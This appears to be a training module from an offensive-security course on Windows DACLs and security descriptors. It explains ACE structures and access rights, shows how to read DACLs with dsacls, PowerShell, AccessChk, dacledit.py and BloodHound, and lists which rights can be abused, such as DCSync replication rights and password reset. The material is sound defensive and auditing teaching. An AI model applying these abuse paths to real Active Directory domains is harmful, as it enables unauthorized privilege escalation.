# DACLs Overview

Within the Windows security ecosystem, `tokens` and `security descriptors` are the two main variables of the object security equation. While `tokens` identify the security context of a process or a thread, `security descriptors` contain the security information associated with an object. To achieve the `Confidentiality` pillar of the `CIA` triad, many operating systems and directory services utilize `access control lists` ( `ACLs`), "a mechanism that implements access control for a system resource by enumerating the system entities that are permitted to access the resource and stating, either implicitly or explicitly, the access modes granted to each entity", according to [RFC4949](https://datatracker.ietf.org/doc/html/rfc4949).

Remember that access control policies dictate what types of access are permitted, under what circumstances, and by whom. The four general categories of access control policies are `Discretionary access control` ( `DAC`), `Mandatory access control` ( `MAC`), `Role-based access control` ( `RBAC`), and `Attribute-based access control` ( `ABAC`).

`DAC`, the traditional method of implementing access control, controls access based on the requestor's identity and access rules stating what requestors are (or are not) allowed to do. It is `discretionary` because an entity might have access rights that permit it, by its own volition, to enable another entity to access some resource; this is in contrast to `MAC`, in which the entity having access to a resource may not, just by its own volition, enable another entity to access that resource. Windows is an example of a `DAC` operating system, which utilizes `Discretionary access control lists` ( `DACLs`).

The image below shows the `DACL`/ `ACL` for the user account `forend` in `Active Directory Users and Computers` ( `ADUC`). Each item under `Permission entries` makes up the `DACL` for the user account. In contrast, the individual entries (such as `Full Control` or `Change Password`) are `Access Control Entries` ( `ACEs`) showing the access rights granted over this user object to various users and groups.

![Sample_ACL.png](l1zSxNrpmvVy.png)

`DACLs` are part of the bigger picture of `security descriptors`. Let us review security descriptors to understand them better and their roles within the access control model.

## Security Descriptors

In Windows, every object (also known as [securable objects](https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects)) has a `security descriptor` data structure that specifies who can perform what actions on the object. The `security descriptor` is a binary data structure that, although it can vary in length and exact contents, can contain six main fields:

- `Revision Number`: The `SRM` ( `Security Reference Monitor`) version of the security model used to create the descriptor.
- `Control Flags`: Optional modifiers that define the behavior/characteristics of the security descriptor.
- `Owner SID`: The object's owner `SID`.
- `Group SID`: The object's primary group `SID`. Only the [Windows POSIX](https://en.wikipedia.org/wiki/Microsoft_POSIX_subsystem) subsystem utilized this member (before being [discontinued](https://social.technet.microsoft.com/wiki/contents/articles/10224.posix-and-unix-support-in-windows.aspx)), and most AD environments now ignore it.
- `Discretionary access control list` ( `DACL`): Specifies who has what access to the object - throughout the `DACL Attacks` mini-modules, our primary focus will be abusing and attacking these.
- `System access control list` ( `SACL`): Specifies which operations by which users should be logged in the security audit log and the explicit integrity level of an object.

Internally, Windows represents a `security descriptor` via the [SECURITY\_DESCRIPTOR struct](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-security_descriptor):

```cpp
typedef struct _SECURITY_DESCRIPTOR {
  BYTE                        Revision;
  BYTE                        Sbz1;
  SECURITY_DESCRIPTOR_CONTROL Control;
  PSID                        Owner;
  PSID                        Group;
  PACL                        Sacl;
  PACL                        Dacl;
} SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;

```

A `security descriptor` can be one of two forms, [absolute or self-relative](https://learn.microsoft.com/en-us/windows/win32/secauthz/absolute-and-self-relative-security-descriptors); `absolute security descriptors` contain pointers to the information (i.e., not the actual information itself), as in the `SECURITY_DESCRIPTOR` struct above, and these are the ones that we will encounter when interacting with Windows objects, whether AD ones or not.

`Self-relative security descriptors` are not very different: instead of storing pointers, they store the actual data of a `security descriptor` in a contiguous memory block. These are meant to store a security descriptor on a disk or transmit it over the wire.

Four of the seven members of the `SECURITY_DESCRIPTOR` struct matter to us for the exploitation of `DACLs`; therefore, we will review them to understand what they are.

#### Control

The `Control` member is of type [SECURITY\_DESCRIPTOR\_CONTROL](https://learn.microsoft.com/en-gb/windows/win32/secauthz/security-descriptor-control), a 16-bit set of bit flags that qualify the meaning of a `security descriptor` or its components. The value of `Control`, when retrieved with the function [GetSecurityDescriptorControl](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-getsecuritydescriptorcontrol), can include a combination of 13 bits flags:

| Flag | Hexadecimal Representation |
| :-- | :-: |
| [SE\_DACL\_AUTO\_INHERIT\_REQ](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_DACL_AUTO_INHERIT_REQ) | `0x0100` |
| [SE\_DACL\_AUTO\_INHERITED](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_DACL_AUTO_INHERITED) | `0x0400` |
| [SE\_DACL\_DEFAULTED](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_DACL_DEFAULTED) | `0x0008` |
| [SE\_DACL\_PRESENT](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_DACL_PRESENT) | `0x0004` |
| [SE\_DACL\_PROTECTED](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_DACL_PROTECTED) | `0x1000` |
| [SE\_GROUP\_DEFAULTED](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_GROUP_DEFAULTED) | `0x0002` |
| [SE\_OWNER\_DEFAULTED](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_OWNER_DEFAULTED) | `0x0001` |
| [SE\_SACL\_AUTO\_INHERIT\_REQ](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_SACL_AUTO_INHERIT_REQ) | `0x0200` |
| [SE\_SACL\_AUTO\_INHERITED](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_SACL_AUTO_INHERITED) | `0x0800` |
| [SE\_SACL\_DEFAULTED](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_SACL_DEFAULTED) | `0x0008` |
| [SE\_SACL\_PRESENT](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_SACL_PRESENT) | `0x0010` |
| [SE\_SACL\_PROTECTED](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_SACL_PROTECTED) | `0x2000` |
| [SE\_SELF\_RELATIVE](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_SELF_RELATIVE) | `0x8000` |

These binary flags can be added to represent any combinations. For example, if the value of `Control` is `0x8014`, it signifies the presence of the `SE_DACL_PRESENT`, `SE_SACL_PRESENT`, and `SE_SELF_RELATIVE` flags.

One important flag for us to know about is [SE\_DACL\_PRESENT](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/secrcw32prov/win32-securitydescriptor#SE_DACL_PRESENT):

| Flag | Meaning |
| :-- | --- |
| `SE_DACL_PRESENT` | Indicates a `security descriptor` that has a `DACL`. If not set, or if set and the `DACL` is `NULL`, the `security descriptor` allows full access to everyone. An `empty DACL` permits access to no one. |

#### Owner

The `Owner` and `Group` members contain a pointer to the `Security Identifier` ( `SID`) of the object's owner and primary group, respectively. Object owners are always granted full control of the `security descriptor`, as they are granted the access rights `RIGHT_WRITE_DAC` ( `WriteDacl`) and `RIGHT_READ_CONTROL` ( `ReadControl`) implicitly.

#### Sacl and Dacl

In Windows, `SACL` ( `System access control list`) and `DACL` ( `Discretionary access control lists`) are the two types of `access control lists` ( `ACLs`), each consisting of a `header` and zero or more `access control entries` ( `ACEs`). (Throughout security literature, when the term `ACL` is used, it usually refers to `DACL`, especially for Windows systems.)

A [SACL](https://learn.microsoft.com/en-gb/windows/win32/ad/retrieving-an-objectampaposs-sacl) contains `ACEs` that dictate the types of access attempts that generate audit records in the `security event log` of a domain controller; therefore, a `SACL` allows administrators to log access attempts to `securable objects`. There are two types of `ACEs` within a `SACL`, `system audit` `ACEs` and `system audit-object` `ACEs`.

While a `DACL` holds `ACEs` that dictate what principals have control rights over a specific object. Internally within Windows, a `DACL` consists of an [ACL](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-acl) followed by an ordered list of zero or more `ACEs` (the same applies to `SACLs`). Below is the struct definition of an `ACL` (recognizing these struct definitions will help us later on when viewing a `security descriptor` from the kernel's point of view):

```cpp
typedef struct _ACL {
  BYTE AclRevision;
  BYTE Sbz1;
  WORD AclSize;
  WORD AceCount;
  WORD Sbz2;
} ACL;

```

## Generic and Object-specific ACEs

An [ACE](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-control-entry) contains a set of user rights and a `SID` that identifies a principal for whom the rights are allowed, denied, or audited. Below is the structure of a `generic ACE`:

![ACE_Structure.png](yzCvgEtIzrjl.png)

Windows represents an `ACE` internally via the struct [ACE\_HEADER](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-ace_header):

```cpp
typedef struct _ACE_HEADER {
  BYTE AceType;
  BYTE AceFlags;
  WORD AceSize;
} ACE_HEADER;

```

In a `DACL`, there can be nine types of `ACEs`, each having the struct `ACE_HEADER` as a member, in addition to the [Mask](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-mask) member (which is of type [ACCESS\_MASK](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-mask) and defines the standard, specific, and generic rights) and `SidStart` (which holds the first 32 bits of the trustee's `SID`):

- [Access Allowed](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_ace)
- [Access Denied](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_denied_ace)
- [Access Allowed Object](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_object_ace)
- [Access Denied Object](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_denied_object_ace)
- [Access Allowed Callback](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_callback_ace)
- [Access Denied Callback](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_denied_callback_ace)
- [Access Allowed Object Callback](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_callback_object_ace)
- [Conditional Claims](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-addconditionalace)

Four main types of `ACEs` are important for us to understand:

| ACE | Implication |
| :-- | :-- |
| [ACCESS\_ALLOWED\_ACE](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_ace) | `Allows` a particular security principal (user or group) to access an `Active Directory object`, such as a user account or group. An `Access Allowed ACE` specifies which permissions the security principal can perform on the object, such as read, write, or modify. |
| [ACCESS\_ALLOWED\_OBJECT\_ACE](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_object_ace) | A specific type of `Access Allowed ACE` that is applied to an object and `grants access` to the object itself and any child objects it contains. An `Access Allowed Object ACE` can grant a security principal the necessary permissions to access an object and its child objects without applying separate `ACEs` to each child object. |
| [ACCESS\_DENIED\_ACE](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_denied_ace) | `Denies` a particular security principal access to an `Active Directory object`, such as a user account or group. An `Access Denied ACE` specifies which permissions the security principal is not allowed to perform on the object, such as read, write, or modify. |
| [ACCESS\_DENIED\_OBJECT\_ACE](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_denied_object_ace) | A specific type of `Access Denied ACE` that is applied to an object and `restricts` access to the object itself and any child objects it contains. An `Access Denied Object ACE` prevents a security principal from accessing an object and its child objects without having to apply separate `ACEs` to each child object. |

As you may have noticed, some `ACEs` include the keyword `Object`, these are [object-specific ACEs](https://learn.microsoft.com/en-us/windows/win32/secauthz/object-specific-aces) used only within `Active Directory`. In addition to the members of `generic ACEs` structure, `object-specific ACEs` contain the members:

- `ObjectType`: A `GUID` containing a type of `child object`, a `property set` or `property`, an `extended right`, or a `validated write`.
- `InheritedObjectType`: Specifies the type of `child object` that can `inherit` the `ACE`.
- `Flags`: Indicates whether the members `ObjectType` and `InheritedObjectType` are present via a set of bit flags.

# Viewing DACLs of AD Objects Manually

After a brief understanding of the fields of a `security descriptor` and before we start auditing and enumerating `DACLs` with automated tools, let us inspect them manually for both AD and non-AD objects (specifcally, `processes`).

## Using dsacls

[dsacls](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)) (the command-line equivalent to the `Security` tab in the `Properties` dialog box of `ADUC`) is a native Windows binary that can display and change `ACEs`/ `permissions` in `ACLs` of AD objects. Let us view the `ACLs` for the user `Yolanda` within the domain `inlanefreight.local`:

#### Using dsacls to view the ACLs of Yolanda

```PowerShell-session
PS C:\Users\Administrator> dsacls.exe "cn=Yolanda,cn=users,dc=inlanefreight,dc=local"

Owner: INLANEFREIGHT\Domain Admins
Group: INLANEFREIGHT\Domain Admins

Access list:
Allow INLANEFREIGHT\Domain Admins     FULL CONTROL
Allow BUILTIN\Account Operators       FULL CONTROL
Allow NT AUTHORITY\Authenticated Users
                                      SPECIAL ACCESS
                                      READ PERMISSONS
Allow NT AUTHORITY\SELF               SPECIAL ACCESS
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Allow NT AUTHORITY\SYSTEM             FULL CONTROL
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS   <Inherited from parent>
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Allow INLANEFREIGHT\luna              SPECIAL ACCESS   <Inherited from parent>
                                      WRITE PERMISSIONS
<SNIP>

```

We can be more specific by fetching out the permissions that other users have against `Yolanda`; for example, let us enumerate the permissions that `Pedro` only has over `Yolanda`:

#### Using dsacls to view the Permissions Pedro has over Yolanda

```PowerShell-session
PS C:\Users\Administrator> dsacls.exe "cn=Yolanda,cn=users,dc=inlanefreight,dc=local" | Select-String "Pedro"

Allow INLANEFREIGHT\pedro             Reset Password

```

## Using PowerShell with DirectoryServices and ActiveDirectorySecurity

Now, we will do the same as above but with `PowerShell`. The [DirectorySearcher](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher?view=dotnet-plat-ext-7.0) class within the `.NET` [System.DirectoryServices](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices?view=dotnet-plat-ext-7.0) namespace contains the [SecurityMasks](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher.securitymasks?view=dotnet-plat-ext-7.0#system-directoryservices-directorysearcher-securitymasks) property that will allow us to access the `DACL` of the object's `security descriptor`. First, we need to get the `security descriptor` of the AD object `Yolanda` as a binary blob:

```PowerShell-session
PS C:\Users\Administrator> $directorySearcher = New-Object System.DirectoryServices.DirectorySearcher('(samaccountname=Yolanda)')
PS C:\Users\Administrator> $directorySearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Owner
PS C:\Users\Administrator> $binarySecurityDescriptor = $directorySearcher.FindOne().Properties.ntsecuritydescriptor[0]
PS C:\Users\Administrator> Write-Host -NoNewline $binarySecurityDescriptor

1 0 4 140 44 7 0 0 0 0 0 0 0 0 0 0 20 0 0 0 4 0 24 7 42 0 0 0 5 0 56 0 0 1 0 0 1 0 0 0 112 149 41 0 109 36 208 17 167 104 0 170 0 110 5 41 1 5 0 0 0 0 0 5 21 0 0 0 45 212 142 75 184 149 12 71 100 136 127 96 9 18 0 0 5 0 56 0 16 0 0 0 1 0 0 0 0 66 22 76 192 32 208 17 167 104 0 170 0 110 5 41 1 5 0 0 0 0 0 5 21 0 0 0 45 212 142 75 184 149 12 71 100 136 127 96 41 2 0 0 5 0 56 0 16 0 0 0 1 0 0 0 16 32 32 95 165 121 208 17 144 32 0 192 79 194 212 207 1 5 0 0 0 0 0 5 21 0 0 0 45 212 142 75 184 149 12 71 100 136 127 96 41 2 0 0 5 0 56 0 16 0 0 0 1 0 0 0 64 194 10 188 169 121 208 17 144 32 0 192 79 194 212 207 1 5 0 0 0 0 0 5 21 0 0 0 45 212 142 75 184 149 12 71 100 136 127 96 41 2 0 0 5 0 56 0 16 0 0 0 1 0 0 0 248 136 112 3 225 10 210 17 180 34 0 160 201 104 249 57 1 5 0 0 0 0 0 5 21 0 0 0 45 212 142 75 184 149 12 71 100 136 127 96 41 2 0 0 5 0 56 0 48 0 0 0 1 0 0 0 127 122 150 191 230 13 208 17 162 133 0 170 0 48 73 226 1 5 0 0 0 0 0 5 21 0 0 0 45 212 142 75 184 149 12 71 100 136 127 96 5 2 0 0 5 0 44 0 16 0 0 0 1 0 0 0 29 177 169 70 174 96 90 64 183 232 255 138 88 212 86 210 1 2 0 0 0 0 0 5 32 0 0 0 48 2 0 0 5 0 44 0 48 0 0 0 1 0 0 0 28 154 182 109 34 148 209 17 174 189 0 0 248 3 103 193 1 2 0 0 0 0 0 5 32 0 0 0 49 2 0 0 5 0 44 0 48 0 0 0 1 0 0 0 98 188 5 88 201 189 40 68 165 226 133 106 15 76 24 94 1 2 0 0 0 0 0 5 32 0 0 0 49 2 0 0 5 0 40 0 0 1 0 0 1 0 0 0 83 26 114 171 47 30 208 17 152 25 0 170 0 64 82 155 1 1 0 0 0 0 0 1 0 0 0 0 5 0 40 0 0 1 0 0 1 0 0 0 83 26 114 171 47 30 208 17 152 25 0 170 0 64 82 155 1 1 0 0 0 0 0 5 10 0 0 0 5 0 40 0 0 1 0 0 1 0 0 0 84 26 114 171 47 30 208 17 152 25 0 170 0 64 82 155 1 1 0 0 0 0 0 5 10 0 0 0 5 0 40 0 0 1 0 0 1 0 0 0 86 26 114 171 47 30 208 17 152 25 0 170 0 64 82 155 1 1 0 0 0 0 0 5 10 0 0 0 5 0 40 0 16 0 0 0 1 0 0 0 66 47 186 89 162 121 208 17 144 32 0 192 79 194 211 207 1 1 0 0 0 <SNIP>

```

Now that we have the `security descriptor` for `Yolanda` as a binary blob, we need to parse it using the function [SetSecurityDescriptorBinaryForm](https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.objectsecurity.setsecuritydescriptorbinaryform?) from the class [ActiveDirectorySecurity](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurity?view=windowsdesktop-8.0). Then we can view all of the `ACEs` of `Yolanda`:

```PowerShell-session
PS C:\Users\Administrator> $parsedSecurityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity
PS C:\Users\Administrator> $parsedSecurityDescriptor.SetSecurityDescriptorBinaryForm($binarySecurityDescriptor)
PS C:\Users\Administrator> $parsedSecurityDescriptor.Access

We can also be more specific and fetch out the permissions that `Pedro` only has over `Yolanda`:

# Viewing DACLs of Processes

## Local Kernel Debugging

To view the `DACL` of the process `explorer.exe` internally, we need to deference the `SecurityDescriptor` pointer within the `ObjectHeader` member of `explorer.exe` (which can be done with `local kernel debugging` and [WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/getting-started-with-windbg)). This will enable us to examine how the Windows kernel sees a `security descriptor`:

## Using AccessChk

[AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) is part of the [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/) suite that enables viewing the specific `access rights` granted to users or groups. For example, to view the `security descriptor` of the process `explorer.exe`, we can use the `-l` parameter:

```PowerShell
PS C:\Users\Admin\Downloads\AccessChk> .\accesschk64.exe -p "explorer.exe" -l

`DACLs`, as per our explanation, consist of an `ACL` data structure followed by an ordered list of zero or more `ACE` data structures. The only difference between the `DACLs` of AD objects and normal objects is the value that members such as `Mask` can have.

# Coming Next

After having a brief understanding of `security descriptors` and `DACLs`, we will go over how to enumerate and audit `DACLs` of objects within an AD environment using automated tools such as `dacledit.py`, `PowerView`, and `BloodHound`.


# DACLs Enumeration

There are two essential `ACE` concepts to comprehend before we start enumerating and attacking `DACLs`, `Access Masks` and `Access Rights`.

## Access Masks and Access Rights

In the previous section, we mentioned that all `ACE` data structures (such as [ACCESS\_ALLOWED\_ACE](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_ace)) contain the `Mask` member, which is of type `ACCESS_MASK`. An `Access Mask` is a 32-bit value that specifies the allowed or denied rights to manipulate an object. The specific format that [access masks follow](https://learn.microsoft.com/en-gb/windows/win32/secauthz/access-mask-format) is shown below:

![Access_Mask_Format.png](1fuooJMaWNM5.png)

For AD objects, the `access mask` contains a combination of the below values (represented in `big-endian` format), noting that `X` indicates bits that are ignored in AD `DACLs`:

![Access_Mask_Bits.png](XVswZp5P0pQW.png)

## Access Mask Bits Interpretation

Understanding how the various `access mask bits` are interpreted is crucial for us, as that will facilitate the exploitation of abusable `DACLs` when we enumerate them. The following lists contain the various types of access rights we may encounter when enumerating `DACLs`:

#### Generic Access Rights Bits

| Display Name | Common Name | Hexadecimal Value | Interpretation |
| :-- | :-- | :-- | :-- |
| `GenericAll` | `GA`/ `RIGHT_GENERIC_ALL` | `0x10000000` | Allows creating or deleting child objects, deleting a subtree, reading and writing properties, examining child objects and the object itself, adding and removing the object from the directory, and reading or writing with an `extended right`. This is equivalent to the `object-specific` access rights bits ( `DE` \| `RC` \| `WD` \| `WO` \| `CC` \| `DC` \| `DT` \| `RP` \| `WP` \| `LC` \| `LO` \| `CR` \| `VW`) for AD objects. |
| `GenericExecute` | `GX`/ `RIGHT_GENERIC_EXECUTE` | `0x20000000` | Allows reading permissions on and listing the contents of a container object. This is equivalent to the `object-specific` access rights bits ( `RC` \| `LC`) for AD objects. |
| `GenericWrite` | `GW`/ `RIGHT_GENERIC_WRITE` | `0x40000000` | Allows reading permissions on this object, writing all the properties on this object, and performing all validated writes to this object. This is equivalent to the `object-specific` access rights bits ( `RC` \| `WP` \| `VW`) for AD objects. |
| `GenericRead` | `GR`/ `RIGHT_GENERIC_READ` | `0x80000000` | Allows reading permissions on this object, reading all the properties on this object, listing this object name when the parent container is listed, and listing the object's contents if it is a [container](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_c3143e71-2ada-417e-83f4-3ef10eff2c56). This is equivalent to the `object-specific` access rights bits ( `RC` \| `LC` \| `RP` \| `LO`) for AD objects. |

#### Standard Access Rights Bits

| Display Name | Common Name | Hexadecimal Value | Interpretation |
| :-- | :-- | :-- | :-- |
| `WriteDacl` | `WD`/ `RIGHT_WRITE_DAC` | `0x00040000` | Allows modifying the object's `security descriptor`'s `discretionary access-control list` ( `DACL`). |
| `WriteOwner` | `WO`/ `RIGHT_WRITE_OWNER` | `0x00080000` | Allows modifying the object's `security descriptor`'s `owner`. A user can only take ownership of an object but cannot transfer ownership of an object to other users. |
| `ReadControl` | `RC`/ `RIGHT_READ_CONTROL` | `0x00020000` | Allows reading the data from the object's `security descriptor`, however, this does not include the data of the `SACL`. |
| `Delete` | `DE`/ `RIGHT_DELETE` | `0x00010000` | Allows deleting the object. |

#### Object-specific Access Rights Bits

| Common Name | Hexadecimal Value | Interpretation |
| :-- | :-- | :-- |
| `CR`/ `RIGHT_DS_CONTROL_ACCESS` | `0x0000100` | Allows performing an operation controlled by a [control access right](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_42f6c9e0-a2b3-4bc3-9b87-fdb902e5505e). The `ObjectType` member of an `ACE` can contain a `GUID` that identifies the `control access right`. If `ObjectType` does not contain a `GUID`, the `ACE` controls the right to perform all `control access right` controlled operations associated with the object. Also referred to as `AllExtendedRights`, especially when `ObjectType` does not contain a `GUID`. |
| `WP`/ `RIGHT_DS_WRITE_PROPERTY` | `0x00000020` | Allows writing properties of the object. The `ObjectType` member of an `ACE` can contain a `GUID` that identifies a property set or an attribute. If `ObjectType` does not contain a `GUID`, the `ACE` controls the right to write `all` object's attributes. |
| `VW`/ `RIGHT_DS_WRITE_PROPERTY_EXTENDED` | `0x00000008` | Allows performing an operation controlled by a [validated write](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/20504d60-43ec-458f-bc7a-754eb64446df) `access right`. The `ObjectType` member of an `ACE` can contain a `GUID` that identifies the `validated write`. If `ObjectType` does not contain a `GUID`, the `ACE` controls the rights to perform all `validated write` operations associated with the object. Also referred to as `Self`. |

Now that we understand how some `access mask bits` are interpreted let us know about specific abusable `extended` and `validated writes` `access rights`.

#### Extended (Object-specific) Access Rights

We will abuse three out of the 56 [extended access rights](https://learn.microsoft.com/en-gb/windows/win32/adschema/extended-rights) in this mini-module:

| Display Name | Common Name | Rights-GUID Value | Interpretation |
| :-- | :-- | :-- | :-- |
| [Reset Password](https://learn.microsoft.com/en-gb/windows/win32/adschema/r-user-force-change-password) | `User-Force-Change-Password` | `00299570-246d-11d0-a768-00aa006e0529` | Allows a user's account password to be reset without knowing the old one. This is in contrast to [User-Change-Password](https://learn.microsoft.com/en-gb/windows/win32/adschema/r-user-change-password), which does require knowing the old password. |
| [Replicating Directory Changes](https://learn.microsoft.com/en-gb/windows/win32/adschema/r-ds-replication-get-changes) | `DS-Replication-Get-Changes` | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Required to replicate changes from a given `NC` ( `Naming Context`). To perform a `DCSync` attack, this extended right and `DS-Replication-Get-Changes-All` are required. |
| [Replicating Directory Changes All](https://learn.microsoft.com/en-gb/windows/win32/adschema/r-ds-replication-get-changes-all) | `DS-Replication-Get-Changes-All` | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | Allows the replication of secret domain data. To perform a `DCSync` attack, this extended right and `DS-Replication-Get-Changes` are required. |

#### Validated Writes

Two out of the five [validated writes](https://learn.microsoft.com/en-gb/windows/win32/adschema/validated-writes) can be abused:

| Display Name | Common Name | Rights-GUID Value | Interpretation |
| :-- | :-- | :-- | :-- |
| [Add/Remove self as member](https://learn.microsoft.com/en-gb/windows/win32/adschema/r-self-membership) | `Self-Membership` | `bf9679c0-0de6-11d0-a285-00aa003049e2` | Allows editing the `member` attribute, therefore enabling setting membership of groups. |
| [Validated write to service principal name](https://learn.microsoft.com/en-gb/windows/win32/adschema/r-validated-spn) | `Validated-SPN` | `f3a64788-5306-11d1-a9c5-0000f80367c1` | Allows editing the `Service Principal Name` ( `SPN`) attribute. |

# Enumerating DACLs

Some automated tools can be used to inspect/enumerate an object's `DACL` to find out what access rights other principals have over it.

On Windows systems, `Get-DomainObjectAcl` and `Add-DomainObjectAcl` from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)'s [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) can be used, as well as `Get-Acl` and `Set-Acl` functions from the built-in `PowerShell` Cmdlets.

On UNIX-like systems, [impacket](https://github.com/fortra/impacket)'s `dacledit.py` can be used for that purpose. At the time of writing, [pull request #1291](https://github.com/SecureAuthCorp/impacket/pull/1291) offering that tool is still being reviewed and in active development. We can get [dacledit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py) directly from the [ShutdownRepo fork](https://github.com/ShutdownRepo/impacket/tree/dacledit) while the branch gets merged into `impacket`'s main branch.

## Installing dacledit.py

To install `dacledit.py`, we will clone the [ShutdownRepo impacket's branch](https://github.com/ShutdownRepo/impacket/tree/dacledit), create a Python virtual environment (to avoid conflict between the original Impacket installation and this branch) and install the forked impacket repository:

#### Clone Forked ShutdownRepo Impacket Repository

```shell
git clone https://github.com/ShutdownRepo/impacket -b dacledit

```

#### Create and Activate the Python Virtual Environment

```shell
cd impacket
pwd
/home/plaintext/htb/modules/dacl/shutdownRepo/impacket
python3 -m venv .dacledit
source .dacledit/bin/activate

```

#### Install ShutdownRepo's Impacket Fork

```shell
python3 -m pip install .

                        inherited by objects within the container/OU (except
                        objects with adminCount=1)

```

`dacledit.py` has the following command-line arguments:

- `-action` defines the operation to conduct. In the below examples, it must be set to `read`. If the argument is not set, it defaults to `read`. The other actions are `write`, `remove`, `backup`, and `restore`.
- `-target`, `-target-sid`, or `-target-dn`, respectively, define the sAMAccountName, Security IDentifier, or Distinguished Name of the object from which the DACL must be retrieved and parsed.
- `-principal`, `-principal-sid`, or `-principal-dn`, respectively, define the `sAMAccountName`, `Security Identifier`, or `Distinguished Name` of the principal to look for and filter in the parsed DACL. This argument is handy to quickly determine what a particular principal can or cannot do on the target object.

In the following example, we can read the DACL for `htb-student`:

#### Reading the DACL of a User

## Auditing DACLs with BloodHound

While manually enumerating an object's `DACL` can be useful in specific cases, it does not simply allow auditing all access rights in an Active Directory domain due to their enormous number.

[BloodHound](https://github.com/BloodHoundAD/BloodHound), one of the most famous tools used for Active Directory auditing, gathers all `DACLs` and correlates them to allow the analysis of rights in graph models, making finding abusable access rights easy. In the [screenshot](https://www.thehacker.recipes/ad/recon/bloodhound) below, some edges (highlighted in red) show abusable `access rights`/ `privileges`:

![bloodhound.png](tiG1g7duGVjZ.png)

`BloodHound` makes auditing easier by separating `control rights` into two categories:

- `Inbound Control Rights`: This is similar to inspecting an object's `DACL`.

- `Outbound Control Rights`: An aggregation and correlation of all references to the object's `SID` in all `DACLs` across the domain.


Review the module [BloodHound for Active Directory](https://academy.hackthebox.com/module/details/69) to learn more about `BloodHound`.

# DACLs Abuses Mindmap

The following mindmap from [DACL abuse - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl#abuse) shows what abuses can be carried out depending on a controlled principal's access rights over a specific type of object. The below mindmap details all abuse scenarios that we will cover in this module and the other `DACL Attacks` mini-modules:

![DACL_Abuse_Paths.png](vUye5IHeEHy8.png)

# Coming Next

